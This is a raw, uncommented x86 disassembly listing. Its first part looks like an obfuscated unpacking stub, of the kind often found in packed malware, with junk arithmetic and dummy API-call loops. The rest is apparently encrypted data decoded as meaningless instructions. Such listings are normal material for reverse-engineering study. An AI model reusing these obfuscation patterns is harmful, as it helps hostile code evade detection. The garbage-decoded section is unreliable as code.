  4191ac:	mov    edx,DWORD PTR [ebp+0x8]
  4191af:	mov    ebx,DWORD PTR [ebp-0x4c]
  4191b2:	add    edx,edi
  4191b4:	and    edx,ebx
  4191b6:	mov    DWORD PTR [ebp-0x4c],edx
  4191b9:	mov    edx,DWORD PTR [ebp+0x8]
  4191bc:	mov    ebx,DWORD PTR [ebp-0x48]
  4191bf:	lea    edx,[ebx+edx*1+0x241fcdf]
  4191c6:	mov    DWORD PTR [ebp-0x48],edx
  4191c9:	mov    edx,DWORD PTR [ebp+0x8]
  4191cc:	mov    ebx,0xfa5e1522
  4191d1:	sub    ebx,edx
  4191d3:	add    ebx,DWORD PTR [ebp-0x44]
  4191d6:	mov    DWORD PTR [ebp-0x44],ebx
  4191d9:	mov    edx,DWORD PTR [ebp+0x8]
  4191dc:	xor    edx,eax
  4191de:	add    edx,esi
  4191e0:	jne    0x419169
  4191e6:	mov    edx,DWORD PTR [ebp-0x8]
  4191e9:	mov    ebx,DWORD PTR [ebp-0xc]
  4191ec:	xor    edx,eax
  4191ee:	lea    edx,[edx+ebx*1+0x3272f6]
  4191f5:	mov    DWORD PTR [ebp-0xc],edx
  4191f8:	mov    edx,DWORD PTR [ebp-0x10]
  4191fb:	xor    edx,eax
  4191fd:	add    edx,esi
  4191ff:	jne    0x416a2c
  419205:	jmp    0x41931c
  41920a:	mov    ecx,DWORD PTR [ebp-0x14]
  41920d:	mov    DWORD PTR [ebp+0x8],ecx
  419210:	jmp    0x419289
  419215:	mov    ecx,DWORD PTR [ebp+0x8]
  419218:	mov    edx,DWORD PTR [ebp-0x8]
  41921b:	xor    ecx,eax
  41921d:	xor    edx,eax
  41921f:	sub    ecx,edx
  419221:	sub    ecx,esi
  419223:	xor    ecx,eax
  419225:	mov    DWORD PTR [ebp+0x8],ecx
  419228:	mov    ecx,DWORD PTR [ebp+0x8]
  41922b:	mov    edx,DWORD PTR [ebp-0x58]
  41922e:	add    ecx,0x5708e4
  419234:	imul   ecx,edx
  419237:	mov    DWORD PTR [ebp-0x58],ecx
  41923a:	mov    ecx,DWORD PTR [ebp+0x8]
  41923d:	mov    edx,DWORD PTR [ebp-0x54]
  419240:	add    ecx,0x64f882
  419246:	or     ecx,edx
  419248:	mov    DWORD PTR [ebp-0x54],ecx
  41924b:	mov    ecx,DWORD PTR [ebp+0x8]
  41924e:	mov    edx,DWORD PTR [ebp-0x50]
  419251:	add    ecx,0x242ebf1
  419257:	xor    ecx,edx
  419259:	mov    DWORD PTR [ebp-0x50],ecx
  41925c:	mov    ecx,DWORD PTR [ebp+0x8]
  41925f:	mov    edx,DWORD PTR [ebp-0x4c]
  419262:	add    ecx,edi
  419264:	and    ecx,edx
  419266:	mov    DWORD PTR [ebp-0x4c],ecx
  419269:	mov    ecx,DWORD PTR [ebp+0x8]
  41926c:	mov    edx,DWORD PTR [ebp-0x48]
  41926f:	lea    ecx,[edx+ecx*1+0x241fcdf]
  419276:	mov    DWORD PTR [ebp-0x48],ecx
  419279:	mov    ecx,DWORD PTR [ebp+0x8]
  41927c:	mov    edx,0xfa5e1522
  419281:	sub    edx,ecx
  419283:	add    edx,DWORD PTR [ebp-0x44]
  419286:	mov    DWORD PTR [ebp-0x44],edx
  419289:	mov    ecx,DWORD PTR [ebp+0x8]
  41928c:	xor    ecx,eax
  41928e:	add    ecx,esi
  419290:	jne    0x419215
  419296:	jmp    0x419328
  41929b:	mov    ecx,DWORD PTR [ebp+0x8]
  41929e:	mov    edx,DWORD PTR [ebp-0x8]
  4192a1:	xor    ecx,eax
  4192a3:	xor    edx,eax
  4192a5:	sub    ecx,edx
  4192a7:	sub    ecx,esi
  4192a9:	xor    ecx,eax
  4192ab:	mov    DWORD PTR [ebp+0x8],ecx
  4192ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4192b1:	mov    edx,DWORD PTR [ebp-0x58]
  4192b4:	add    ecx,0x5708e4
  4192ba:	imul   ecx,edx
  4192bd:	mov    DWORD PTR [ebp-0x58],ecx
  4192c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4192c3:	mov    edx,DWORD PTR [ebp-0x54]
  4192c6:	add    ecx,0x64f882
  4192cc:	or     ecx,edx
  4192ce:	mov    DWORD PTR [ebp-0x54],ecx
  4192d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4192d4:	mov    edx,DWORD PTR [ebp-0x50]
  4192d7:	add    ecx,0x242ebf1
  4192dd:	xor    ecx,edx
  4192df:	mov    DWORD PTR [ebp-0x50],ecx
  4192e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4192e5:	mov    edx,DWORD PTR [ebp-0x4c]
  4192e8:	add    ecx,edi
  4192ea:	and    ecx,edx
  4192ec:	mov    DWORD PTR [ebp-0x4c],ecx
  4192ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4192f2:	mov    edx,DWORD PTR [ebp-0x48]
  4192f5:	lea    ecx,[edx+ecx*1+0x241fcdf]
  4192fc:	mov    DWORD PTR [ebp-0x48],ecx
  4192ff:	mov    ecx,DWORD PTR [ebp+0x8]
  419302:	mov    edx,0xfa5e1522
  419307:	sub    edx,ecx
  419309:	add    edx,DWORD PTR [ebp-0x44]
  41930c:	mov    DWORD PTR [ebp-0x44],edx
  41930f:	mov    ecx,DWORD PTR [ebp+0x8]
  419312:	xor    ecx,eax
  419314:	add    ecx,esi
  419316:	jne    0x41929b
  41931c:	mov    ecx,DWORD PTR [ebp-0x8]
  41931f:	xor    ecx,eax
  419321:	mov    eax,DWORD PTR [ebp+0x10]
  419324:	add    ecx,esi
  419326:	mov    DWORD PTR [eax],ecx
  419328:	pop    edi
  419329:	pop    esi
  41932a:	pop    ebx
  41932b:	leave  
  41932c:	ret    0xc
  41932f:	push   ebp
  419330:	mov    ebp,esp
  419332:	sub    esp,0x78
  419335:	and    DWORD PTR ds:0x428eaf,0x46d6
  41933f:	push   esi
  419340:	push   edi
  419341:	or     eax,DWORD PTR ds:0x428e37
  419347:	mov    eax,ds:0x428373
  41934c:	or     ecx,edi
  41934e:	mov    DWORD PTR [ebp-0x24],eax
  419351:	and    DWORD PTR ds:0x428eb3,0x0
  41935b:	jmp    0x41936b
  419360:	mov    eax,ds:0x428eb3
  419365:	inc    eax
  419366:	mov    ds:0x428eb3,eax
  41936b:	cmp    DWORD PTR ds:0x428eb3,0x15
  419372:	jae    0x41939a
  419378:	cmp    DWORD PTR ds:0x428eb3,0x21
  41937f:	ja     0x41939a
  419385:	jmp    0x419395
  41938a:	push   0x6ea1
  41938f:	call   DWORD PTR ds:0x42aa27
  419395:	jmp    0x419360
  41939a:	mov    eax,ds:0x428493
  41939f:	mov    DWORD PTR [ebp-0x30],eax
  4193a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4193a9:	sub    DWORD PTR ds:0x428e3f,edi
  4193af:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  4193b6:	mov    eax,DWORD PTR [ebp-0x10]
  4193b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4193bc:	sub    eax,ecx
  4193be:	mov    DWORD PTR [ebp-0x10],eax
  4193c1:	and    DWORD PTR ds:0x428e93,edi
  4193c7:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4193ce:	adc    ecx,0x318b
  4193d4:	mov    eax,DWORD PTR [ebp-0x18]
  4193d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4193da:	xor    DWORD PTR ds:0x428e8f,edi
  4193e0:	sub    eax,ecx
  4193e2:	mov    DWORD PTR [ebp-0x18],eax
  4193e5:	sbb    DWORD PTR ds:0x428e5b,ebx
  4193eb:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4193f2:	or     DWORD PTR ds:0x428e2f,ebx
  4193f8:	mov    eax,DWORD PTR [ebp-0xc]
  4193fb:	adc    DWORD PTR ds:0x428e47,ecx
  419401:	mov    ecx,DWORD PTR [ebp-0xc]
  419404:	sub    eax,ecx
  419406:	add    DWORD PTR ds:0x428e6f,edx
  41940c:	mov    DWORD PTR [ebp-0xc],eax
  41940f:	and    DWORD PTR ds:0x428eb7,ecx
  419415:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  41941c:	add    DWORD PTR ds:0x428ec7,ebx
  419422:	mov    eax,DWORD PTR [ebp-0x1c]
  419425:	mov    ecx,DWORD PTR [ebp-0x1c]
  419428:	sub    eax,ecx
  41942a:	add    edi,0xa93
  419430:	mov    DWORD PTR [ebp-0x1c],eax
  419433:	or     DWORD PTR ds:0x428e87,0x297e
  41943d:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  419444:	mov    eax,DWORD PTR [ebp-0x20]
  419447:	mov    DWORD PTR ds:0x428e9f,0x15
  419451:	cmp    DWORD PTR ds:0x428e9f,0x0
  419458:	je     0x4194a7
  41945e:	cmp    DWORD PTR ds:0x428e9f,0x5
  419465:	jb     0x4194a7
  41946b:	jmp    0x419479
  419470:	push   DWORD PTR [ebp-0x20]
  419473:	call   DWORD PTR ds:0x42aa2b
  419479:	cmp    DWORD PTR ds:0x428e9f,0x6
  419480:	jne    0x419495
  419486:	xor    edi,edi
  419488:	or     edi,DWORD PTR ds:0x428e9f
  41948e:	dec    edi
  41948f:	mov    DWORD PTR ds:0x428e9f,edi
  419495:	mov    edi,DWORD PTR ds:0x428e9f
  41949b:	dec    edi
  41949c:	mov    DWORD PTR ds:0x428e9f,edi
  4194a2:	jmp    0x419451
  4194a7:	mov    ecx,DWORD PTR [ebp-0x20]
  4194aa:	sub    DWORD PTR ds:0x428e73,0x4181
  4194b4:	sub    eax,ecx
  4194b6:	mov    DWORD PTR [ebp-0x20],eax
  4194b9:	neg    edi
  4194bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4194be:	mov    ecx,DWORD PTR [ebp-0x20]
  4194c1:	mov    esi,0x75108af
  4194c6:	xor    eax,esi
  4194c8:	add    DWORD PTR ds:0x428e2f,0x596
  4194d2:	mov    edi,0x3272f6
  4194d7:	or     DWORD PTR ds:0x428e43,0x428e77
  4194e1:	add    eax,edi
  4194e3:	or     eax,ecx
  4194e5:	mov    DWORD PTR ds:0x428e43,0x54e0
  4194ef:	mov    DWORD PTR [ebp-0x20],eax
  4194f2:	add    eax,0x58c9
  4194f7:	mov    eax,DWORD PTR [ebp-0x4]
  4194fa:	jmp    0x41b84d
  4194ff:	imul   edx,DWORD PTR [edi],0x45054527
  419505:	or     DWORD PTR [edi],edx
  419507:	dec    esp
  419508:	xchg   ecx,eax
  419509:	in     al,0xff
  41950b:	dec    edx
  41950c:	pop    esi
  41950d:	or     BYTE PTR [esi],ah
  41950f:	pop    ebp
  419510:	and    BYTE PTR [edx-0x7c9fb27d],al
  419516:	sbb    DWORD PTR [ecx-0x7357d9da],0x28
  41951d:	pop    ss
  41951e:	das    
  41951f:	pop    edi
  419520:	dec    esp
  419521:	push   ds
  419522:	(bad)  
  419523:	jge    0x419569
  419525:	ds xor eax,edx
  419528:	loop   0x41951f
  41952a:	fild   WORD PTR [ecx+0x8]
  41952d:	aaa    
  41952e:	std    
  41952f:	jl     0x41956f
  419531:	or     al,0xca
  419533:	ja     0x41950c
  419535:	daa    
  419536:	mov    esi,0xbb61c921
  41953b:	mov    eax,0x627ff6f6
  419540:	(bad)  
  419541:	pop    edx
  419542:	sbb    bl,cl
  419544:	inc    ebx
  419545:	and    esi,DWORD PTR [ebx-0x5f50558a]
  41954b:	(bad)  
  41954c:	dec    ebx
  41954d:	sbb    al,0xd3
  41954f:	push   ebp
  419550:	(bad)  
  419551:	repnz ss fdivr st(0),st
  419555:	mov    edx,0x8a7aff12
  41955a:	pop    esi
  41955b:	mov    eax,0x1e947a87
  419560:	or     ch,BYTE PTR [eax+0x54a822a9]
  419566:	(bad)  
  419567:	jg     0x419584
  419569:	cli    
  41956a:	and    eax,DWORD PTR [edi+0xe]
  41956d:	xlat   BYTE PTR ds:[ebx]
  41956e:	jp     0x4195bc
  419570:	enter  0xcce7,0x8e
  419574:	ins    BYTE PTR es:[edi],dx
  419575:	fistp  DWORD PTR [edx-0x26c4bfb8]
  41957b:	sub    ebp,DWORD PTR [edx]
  41957d:	or     DWORD PTR [ebx-0x1238507b],0xfe90eea2
  419587:	pop    esp
  419588:	mov    ds:0x62358713,eax
  41958d:	push   esp
  41958e:	cmp    BYTE PTR ds:0x3c19eea3,cl
  419594:	xchg   ebp,eax
  419595:	call   0x9993:0x208f2d7a
  41959c:	mov    bl,0xe0
  41959e:	sbb    DWORD PTR [ecx-0x2b],edi
  4195a1:	dec    ecx
  4195a2:	out    dx,eax
  4195a3:	mov    cs,WORD PTR [edx-0x280e2be4]
  4195a9:	aam    0xbf
  4195ab:	add    al,0x12
  4195ad:	pop    esi
  4195ae:	das    
  4195af:	retf   0x5bc5
  4195b2:	push   edi
  4195b3:	push   esi
  4195b4:	mov    bh,0x5a
  4195b6:	xchg   BYTE PTR [esi+0x151d4b30],al
  4195bc:	mov    ds:0x244a349a,al
  4195c1:	daa    
  4195c2:	ja     0x419568
  4195c4:	sbb    ecx,esi
  4195c6:	into   
  4195c7:	mov    esi,DWORD PTR [edi-0x55]
  4195ca:	cli    
  4195cb:	ret    0x9e81
  4195ce:	push   es
  4195cf:	mov    ch,0x29
  4195d1:	adc    dh,BYTE PTR [edi-0x4ff3c392]
  4195d7:	sahf   
  4195d8:	xchg   esi,eax
  4195d9:	std    
  4195da:	ja     0x419580
  4195dc:	jle    0x419633
  4195de:	stos   BYTE PTR es:[edi],al
  4195df:	xchg   DWORD PTR [eax],edx
  4195e1:	dec    esi
  4195e2:	jecxz  0x419636
  4195e4:	test   al,0x4e
  4195e6:	inc    edx
  4195e7:	mov    ch,0x52
  4195e9:	out    dx,al
  4195ea:	icebp  
  4195eb:	mov    esp,0x227cff5e
  4195f0:	jg     0x41966f
  4195f2:	push   esp
  4195f3:	cmp    dh,0x67
  4195f6:	xor    eax,0xf9d5b28a
  4195fb:	push   esp
  4195fc:	adc    eax,0x2b6b9708
  419601:	cmp    al,0x9a
  419603:	pop    edx
  419604:	lds    eax,FWORD PTR [ecx+0x25ef552]
  41960a:	xchg   ecx,eax
  41960b:	inc    esi
  41960c:	aam    0x8f
  41960e:	(bad)  
  41960f:	mov    dh,0x65
  419611:	pop    es
  419612:	cmp    DWORD PTR [ebx+0x21cbce75],esp
  419618:	fwait
  419619:	pop    edx
  41961a:	jno    0x4195eb
  41961c:	mov    esi,0x1bcc1149
  419621:	and    eax,0x46ec1715
  419626:	xor    edx,DWORD PTR [eax+0x721b1a51]
  41962c:	(bad)  
  41962d:	jnp    0x419646
  41962f:	add    esi,DWORD PTR [esi+0x9]
  419632:	sbb    dh,BYTE PTR [ebx]
  419634:	xchg   esp,eax
  419635:	repnz and BYTE PTR [ebp-0x2c8688d1],0xd2
  41963d:	sbb    ch,ah
  41963f:	xor    BYTE PTR [ebp-0x453cb51b],bl
  419645:	fwait
  419646:	dec    ebx
  419647:	mov    eax,ds:0xae10f947
  41964c:	rcl    esp,1
  41964e:	adc    eax,0x75d7336d
  419653:	in     al,0x43
  419655:	adc    eax,0x8403e24f
  41965a:	shl    DWORD PTR [ebx-0x3ff5c155],cl
  419660:	call   0x4a4e569a
  419665:	mov    eax,0x786e6379
  41966a:	lods   eax,DWORD PTR ds:[esi]
  41966b:	or     BYTE PTR [ecx+edx*4],cl
  41966e:	dec    edi
  41966f:	xchg   edx,eax
  419670:	mov    bh,0x3c
  419672:	and    DWORD PTR [eax-0x68],esi
  419675:	pop    ss
  419676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419677:	sbb    dh,cl
  419679:	sbb    edi,DWORD PTR [ebp-0x4fc4b2c8]
  41967f:	mov    ds:0xa1c49bd,eax
  419684:	add    bh,BYTE PTR [edi+edi*1]
  419687:	and    DWORD PTR [edi+0x4275f1b9],eax
  41968d:	push   ecx
  41968e:	stc    
  41968f:	mov    cl,0x6a
  419691:	mov    al,ds:0x3329ff6e
  419696:	add    eax,esi
  419698:	and    bh,ah
  41969a:	push   edx
  41969b:	outs   dx,DWORD PTR ds:[esi]
  41969c:	das    
  41969d:	jge    0x4196a4
  41969f:	js     0x4196d4
  4196a1:	test   BYTE PTR [edi-0x3a],ch
  4196a4:	inc    ecx
  4196a5:	fwait
  4196a6:	sub    bh,BYTE PTR [ebx+0x52]
  4196a9:	addr16 retf 
  4196ab:	inc    ecx
  4196ac:	into   
  4196ad:	nop
  4196ae:	pushw  ds
  4196b0:	cs cdq 
  4196b2:	push   cs
  4196b3:	lods   eax,DWORD PTR ds:[esi]
  4196b4:	mov    ds:0x9055870,eax
  4196b9:	fadd   DWORD PTR [ecx+0x6daa9aba]
  4196bf:	jb     0x41973c
  4196c1:	outs   dx,BYTE PTR ds:[esi]
  4196c2:	stos   DWORD PTR es:[edi],eax
  4196c3:	or     DWORD PTR [ecx+eax*4+0x1e],esi
  4196c7:	and    eax,0xaa3cbb38
  4196cc:	adc    al,0xd8
  4196ce:	adc    BYTE PTR [ecx],dl
  4196d0:	push   0x3e53fcb4
  4196d5:	jle    0x4196f0
  4196d7:	mov    ecx,edx
  4196d9:	mov    eax,ds:0x4cd494ce
  4196de:	dec    eax
  4196df:	sbb    eax,0x5637668d
  4196e4:	leave  
  4196e5:	mov    eax,ds:0xa9cd5a74
  4196ea:	pop    edi
  4196eb:	pop    ecx
  4196ec:	jle    0x41973f
  4196ee:	add    ch,BYTE PTR [esi+0x7ffa2b7d]
  4196f4:	jecxz  0x419722
  4196f6:	lahf   
  4196f7:	call   0xc641a3f3
  4196fc:	icebp  
  4196fd:	in     al,0x69
  4196ff:	ret    0x6ebf
  419702:	loop   0x4196b2
  419704:	push   edi
  419705:	lock or edi,ebx
  419708:	mov    al,ds:0x4a827244
  41970d:	int3   
  41970e:	inc    esp
  41970f:	jge    0x419720
  419711:	cvtps2pd xmm5,QWORD PTR [ecx+0x7efabfb2]
  419718:	arpl   bp,ax
  41971a:	cmc    
  41971b:	jno    0x419745
  41971d:	xchg   esi,eax
  41971e:	mov    cl,0x7c
  419720:	popf   
  419721:	es sbb eax,eax
  419724:	adc    al,0xa
  419726:	jno    0x4196f6
  419728:	lea    esi,[ebx]
  41972a:	xchg   edi,eax
  41972b:	les    esi,FWORD PTR ss:[edx-0x47]
  41972f:	cmc    
  419730:	enter  0x560e,0x91
  419734:	daa    
  419735:	leave  
  419736:	inc    edi
  419737:	or     ch,ch
  419739:	jle    0x419730
  41973b:	idiv   BYTE PTR [ecx+0x5645afb7]
  419741:	lock test BYTE PTR [ecx],0x8a
  419745:	in     al,dx
  419746:	stc    
  419747:	shr    ch,cl
  419749:	mov    ebp,0xf5688be2
  41974e:	sbb    ch,BYTE PTR [ebx+0x1b]
  419751:	mov    ah,0xb2
  419753:	sub    al,0x97
  419755:	xor    eax,0x2714eacb
  41975a:	or     ecx,ebp
  41975c:	or     bl,BYTE PTR [edx]
  41975e:	call   0x3e56de33
  419763:	std    
  419764:	mov    eax,0x9f82f6fa
  419769:	or     eax,0x4eb9d648
  41976e:	sub    cl,BYTE PTR [ebp-0x64a13502]
  419774:	xchg   esp,esp
  419776:	call   0xa11bbbc1
  41977b:	int    0x44
  41977d:	sbb    eax,0x98d2ae8f
  419782:	mov    edx,0xd23bf5b5
  419787:	rcl    dh,0x92
  41978a:	mov    eax,ds:0x395fa1ac
  41978f:	int    0x82
  419791:	xor    ch,ch
  419793:	out    0x3d,al
  419795:	adc    DWORD PTR [eax],esp
  419797:	add    DWORD PTR [ebx],ebp
  419799:	mov    eax,ds:0x58f9481c
  41979e:	outs   dx,DWORD PTR ds:[esi]
  41979f:	cwde   
  4197a0:	add    eax,0x6e8ddc50
  4197a5:	repnz push edx
  4197a7:	in     al,dx
  4197a8:	or     al,0x18
  4197aa:	adc    eax,0x56ff5346
  4197af:	sub    DWORD PTR [edi+0x68d30a98],ecx
  4197b5:	sbb    ch,BYTE PTR [eax-0x30c5517c]
  4197bb:	cmc    
  4197bc:	jl     0x41982e
  4197be:	inc    eax
  4197bf:	aam    0xa4
  4197c1:	fst    DWORD PTR [ebx]
  4197c3:	xor    esi,DWORD PTR [esi-0x86122ac]
  4197c9:	leave  
  4197ca:	test   al,0xff
  4197cc:	outs   dx,DWORD PTR ds:[esi]
  4197cd:	add    edx,ecx
  4197cf:	push   es
  4197d0:	psubd  mm4,QWORD PTR [esi+ebx*2-0x29]
  4197d5:	out    0xf6,eax
  4197d7:	mov    DWORD PTR [ebx-0x70e2ac5c],ebp
  4197dd:	test   al,0x42
  4197df:	add    BYTE PTR [edx],bh
  4197e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197e2:	dec    edx
  4197e3:	xchg   ecx,eax
  4197e4:	push   ebx
  4197e5:	retf   
  4197e6:	mov    edx,0xe7862cdf
  4197eb:	(bad)  
  4197ec:	ins    BYTE PTR es:[edi],dx
  4197ed:	repz enter 0x582c,0x86
  4197f2:	dec    ebp
  4197f3:	jns    0x41986f
  4197f5:	mov    cl,0xf0
  4197f7:	adc    bl,BYTE PTR [ebx]
  4197f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197fa:	les    ecx,FWORD PTR [edx+edi*1+0x48]
  4197fe:	bound  edx,QWORD PTR [eax]
  419800:	xor    DWORD PTR [eax],ecx
  419802:	mov    eax,0x7f20a834
  419807:	mov    ds:0xf9f85308,eax
  41980c:	das    
  41980d:	std    
  41980e:	fidivr WORD PTR es:[ebp+esi*1+0x3d3c97e8]
  419816:	mov    ecx,0x84ab2fd5
  41981b:	hlt    
  41981c:	ds mov bh,0xd5
  41981f:	retf   
  419820:	mov    esi,DWORD PTR [edx+0x3f924086]
  419826:	mov    al,ds:0xb073a46b
  41982b:	mov    edx,0x17daffbf
  419830:	stos   BYTE PTR es:[edi],al
  419831:	jecxz  0x419801
  419833:	in     ax,0x1e
  419836:	pop    edx
  419837:	xchg   BYTE PTR [ecx+0x4578170a],dh
  41983d:	pop    ss
  41983e:	sub    ecx,DWORD PTR [edx]
  419840:	xor    dh,BYTE PTR [esi]
  419842:	xchg   DWORD PTR [ebx],ebp
  419844:	and    esp,DWORD PTR ds:0x21b648f1
  41984a:	scas   al,BYTE PTR es:[edi]
  41984b:	dec    eax
  41984c:	mov    dl,0x4e
  41984e:	fisttp QWORD PTR [ebp+0x3b]
  419851:	xor    BYTE PTR [eax],cl
  419853:	in     al,dx
  419854:	sbb    al,0xf9
  419856:	sub    edx,edi
  419858:	or     DWORD PTR [eax+0x6282f19d],0x2e
  41985f:	sbb    dh,ah
  419861:	(bad)  [ebx]
  419863:	xchg   ebx,eax
  419864:	je     0x4198c7
  419866:	call   0x7c44:0xd9f3e3f3
  41986d:	sar    ebp,1
  41986f:	iret   
  419870:	cmp    DWORD PTR [ecx-0x3e1c43a4],edi
  419876:	push   0xffffff8e
  419878:	shl    DWORD PTR [ebp-0x9bfedda],0x96
  41987f:	inc    ebp
  419880:	imul   ebx,DWORD PTR [edi],0x3c
  419883:	cmp    al,BYTE PTR [ebx+0x17]
  419886:	mov    ebp,0x152d7433
  41988b:	stos   DWORD PTR es:[edi],eax
  41988c:	cmp    BYTE PTR es:[ebx],dh
  41988f:	fcom   QWORD PTR [edi+0x3dfd8882]
  419895:	adc    DWORD PTR ds:0x39988afd,esp
  41989b:	lds    edx,FWORD PTR [edx-0x2a]
  41989e:	adc    bl,BYTE PTR [ecx+eax*2]
  4198a1:	rsqrtps xmm7,XMMWORD PTR [ebx]
  4198a4:	mov    BYTE PTR [edx+edi*1],ch
  4198a7:	xlat   BYTE PTR ds:[ebx]
  4198a8:	ja     0x419925
  4198aa:	(bad)  
  4198ab:	sub    edx,DWORD PTR [esi-0xf]
  4198ae:	sti    
  4198af:	shl    BYTE PTR [eax-0x1cd323ab],cl
  4198b5:	in     eax,dx
  4198b6:	push   edx
  4198b7:	call   0x781c7632
  4198bc:	pop    ecx
  4198bd:	mul    BYTE PTR [ebx+0x17]
  4198c0:	push   0xa4216565
  4198c5:	pop    ebp
  4198c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198c7:	adc    al,0x5e
  4198c9:	fmulp  st(6),st
  4198cb:	mov    bl,0x51
  4198cd:	arpl   bx,dx
  4198cf:	repz mov al,ds:0xb17ba6b0
  4198d5:	and    cl,BYTE PTR gs:[edi+0x57]
  4198d9:	lahf   
  4198da:	ret    
  4198db:	repz xor BYTE PTR [ebx-0x30],0xf2
  4198e0:	pop    esp
  4198e1:	or     eax,0xddbf2ebf
  4198e6:	into   
  4198e7:	sub    eax,0x1b8f7d9c
  4198ec:	adc    al,cl
  4198ee:	ret    0x94e8
  4198f1:	imul   DWORD PTR [ecx+0x3f00d9ac]
  4198f7:	push   ebp
  4198f8:	call   ebp
  4198fa:	push   edx
  4198fb:	jb     0x41992c
  4198fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198fe:	es leave 
  419900:	shl    ah,0x25
  419903:	repz xor al,0x34
  419906:	test   al,0x72
  419908:	jne    0x41996e
  41990a:	rol    DWORD PTR [esi-0x25],cl
  41990d:	cmp    DWORD PTR [ecx],eax
  41990f:	xor    al,0x92
  419911:	lea    ebp,[ecx]
  419913:	shr    BYTE PTR [edx+0x1702a0e8],0x3a
  41991a:	ret    
  41991b:	arpl   WORD PTR [esi],bp
  41991d:	sub    dl,BYTE PTR [ebp+0x7225fd6d]
  419923:	pop    esi
  419924:	dec    esp
  419925:	inc    ebp
  419926:	sbb    al,0xeb
  419928:	dec    edx
  419929:	test   DWORD PTR [ebx+0x2a2dcbd3],ebx
  41992f:	jno    0x419903
  419931:	or     eax,DWORD PTR [eax+0x3964d2d6]
  419937:	mov    dl,BYTE PTR [ecx+0x237e27d2]
  41993d:	out    0x92,al
  41993f:	xor    bl,BYTE PTR [edi+0x664ba023]
  419945:	arpl   si,sp
  419947:	test   al,0xaf
  419949:	mov    cl,0x8
  41994b:	inc    esi
  41994c:	add    DWORD PTR [ecx],edi
  41994e:	cmc    
  41994f:	mov    edx,0x29314c21
  419954:	int    0x34
  419956:	xchg   BYTE PTR [esi+ebp*2],ch
  419959:	out    0xb5,eax
  41995b:	outs   dx,DWORD PTR ds:[esi]
  41995c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41995d:	add    ecx,esp
  41995f:	dec    edx
  419960:	inc    eax
  419961:	and    bl,BYTE PTR [ebx-0x3efd72b3]
  419967:	imul   BYTE PTR [esi]
  419969:	mov    ecx,0xb9821ec1
  41996e:	loop   0x41994e
  419970:	outs   dx,DWORD PTR ds:[esi]
  419971:	inc    esp
  419972:	cld    
  419973:	cmp    dl,al
  419975:	dec    esp
  419976:	xchg   esi,eax
  419977:	sbb    al,dl
  419979:	out    0xb4,al
  41997b:	sahf   
  41997c:	scas   eax,DWORD PTR es:[edi]
  41997d:	daa    
  41997e:	iret   
  41997f:	sub    ah,BYTE PTR [ebx-0x79]
  419982:	push   ebx
  419983:	add    eax,0x29deeb1b
  419988:	cmp    edi,DWORD PTR ds:0xa0f5bbd6
  41998e:	cmp    ecx,ebp
  419990:	call   0x1f7:0xdd53ed53
  419997:	neg    edx
  419999:	ret    0xcd6e
  41999c:	imul   edi,esi,0xae384ed7
  4199a2:	mov    cl,0xb7
  4199a4:	not    BYTE PTR [ebx]
  4199a6:	leave  
  4199a7:	and    BYTE PTR [eax-0x63],dl
  4199aa:	jle    0x4199a3
  4199ac:	ins    DWORD PTR es:[edi],dx
  4199ad:	sbb    eax,0x97675e66
  4199b2:	and    cl,dl
  4199b4:	fmul   st(3),st
  4199b6:	cmp    eax,0xd77e2e3b
  4199bb:	test   eax,0x63ca1ae8
  4199c0:	imul   edx
  4199c2:	sti    
  4199c3:	and    BYTE PTR [edx-0x23],ch
  4199c6:	jbe    0x4199a4
  4199c8:	xor    bh,0x51
  4199cb:	pop    ebp
  4199cc:	mov    al,0x46
  4199ce:	popf   
  4199cf:	gs daa 
  4199d1:	mov    cl,0x59
  4199d3:	mov    al,0xdc
  4199d5:	(bad)  
  4199d6:	jle    0x4199b6
  4199d8:	xchg   esi,eax
  4199d9:	icebp  
  4199da:	ss jae 0x41998a
  4199dd:	in     al,dx
  4199de:	pop    eax
  4199df:	cld    
  4199e0:	dec    esi
  4199e1:	push   ds
  4199e2:	cs and al,0xc8
  4199e5:	mov    eax,0x26189139
  4199ea:	jle    0x4199bf
  4199ec:	in     al,0x11
  4199ee:	int3   
  4199ef:	cli    
  4199f0:	hlt    
  4199f1:	out    dx,al
  4199f2:	jmp    0x54fa:0x2f6d85de
  4199f9:	ficom  DWORD PTR [edx]
  4199fb:	inc    eax
  4199fc:	into   
  4199fd:	pop    ss
  4199fe:	shl    BYTE PTR [edx+0x43],0x49
  419a02:	push   edi
  419a03:	pop    eax
  419a04:	fld    QWORD PTR [ecx-0x29]
  419a07:	inc    eax
  419a08:	sub    al,0x2b
  419a0a:	fld    TBYTE PTR ds:0x4fd0fc86
  419a10:	jne    0x419a53
  419a12:	ja     0x4199f8
  419a14:	stos   DWORD PTR es:[edi],eax
  419a15:	mov    ds:0xbeb2660,eax
  419a1a:	sbb    esp,DWORD PTR [eax+eiz*2]
  419a1d:	jl     0x4199aa
  419a1f:	add    al,0x8f
  419a21:	aam    0x2
  419a23:	daa    
  419a24:	(bad)  
  419a25:	and    bh,BYTE PTR [ecx-0x255d68b5]
  419a2b:	cmp    al,0x74
  419a2d:	cld    
  419a2e:	js     0x4199f5
  419a30:	out    0xf,al
  419a32:	mov    edi,0x714781aa
  419a37:	ja     0x419a17
  419a39:	cmp    esp,ebx
  419a3b:	push   dx
  419a3d:	bound  ebx,QWORD PTR [ebp-0x3f]
  419a40:	(bad)  
  419a41:	std    
  419a42:	sub    BYTE PTR cs:[ebx+0x2],bl
